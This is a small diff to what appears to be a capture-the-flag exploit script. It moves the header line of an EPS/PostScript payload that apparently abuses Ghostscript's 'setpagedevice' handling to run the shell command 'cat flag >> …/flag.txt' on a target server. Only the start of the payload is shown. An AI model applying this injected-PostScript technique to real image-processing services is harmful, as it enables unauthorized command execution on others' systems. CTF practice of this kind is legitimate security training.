@@ -3,8 +3,7 @@
 
 Path = "cat flag >> /app/application/static/petpets/flag.txt"
 
-payload = r"""
-%!PS-Adobe-3.0 EPSF-3.0
+payload = r"""%!PS-Adobe-3.0 EPSF-3.0
 %%BoundingBox: -0 -0 100 100
 
 userdict /setpagedevice undef
